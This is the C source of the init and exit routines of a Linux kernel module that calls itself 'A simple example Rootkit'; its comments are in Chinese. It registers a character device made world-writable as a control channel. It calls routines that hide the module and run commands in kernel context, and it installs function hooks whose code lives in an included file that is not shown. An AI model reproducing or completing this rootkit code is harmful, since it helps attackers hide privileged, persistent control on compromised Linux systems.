#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/device.h>
#include <linux/module.h>
#include "functions.c"

// 模块加载、卸载函数定义
static int __init rootkit_init(void)
{
    int err;
    // 注册设备
    major_num = register_chrdev(0, DEVICE_NAME, &rootkit_fo);
    if (major_num < 0)
        return major_num;

    // 创建设备响应类模块
    module_class = class_create(THIS_MODULE, CLASS_NAME);
    if (IS_ERR(module_class))
    {
        unregister_chrdev(major_num, DEVICE_NAME);
        return PTR_ERR(module_class);
    }

    // 创建设备节点
    module_device = device_create(module_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_NAME);
    if (IS_ERR(module_device))
    {
        class_destroy(module_class);
        unregister_chrdev(major_num, DEVICE_NAME);
        return PTR_ERR(module_device);
    }
    __file = filp_open(DEVICE_PATH, O_RDWR, 0);
    if (IS_ERR(__file)) // failed
    {
        device_destroy(module_class, MKDEV(major_num, 0));
        class_destroy(module_class);
        unregister_chrdev(major_num, DEVICE_NAME);
        return PTR_ERR(__file);
    }
    __inode = file_inode(__file);
    __inode->i_mode |= 0666;
    filp_close(__file, NULL);

    // 模块测试
    module_info();
    hide_myself();
    show_myself();
    exec_cmd("ls");
    
    
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err)
        return err;
    pr_info("Module install successful!!!\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    device_destroy(module_class, MKDEV(major_num, 0));
    class_destroy(module_class);
    unregister_chrdev(major_num, DEVICE_NAME);
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    pr_info("Module uninstall successful!\n");
}

// 模块信息声明
MODULE_LICENSE("GPL");
MODULE_AUTHOR("ice");
MODULE_DESCRIPTION("A simple example Rootkit.");
MODULE_VERSION("1.0");
module_init(rootkit_init);
module_exit(rootkit_exit);
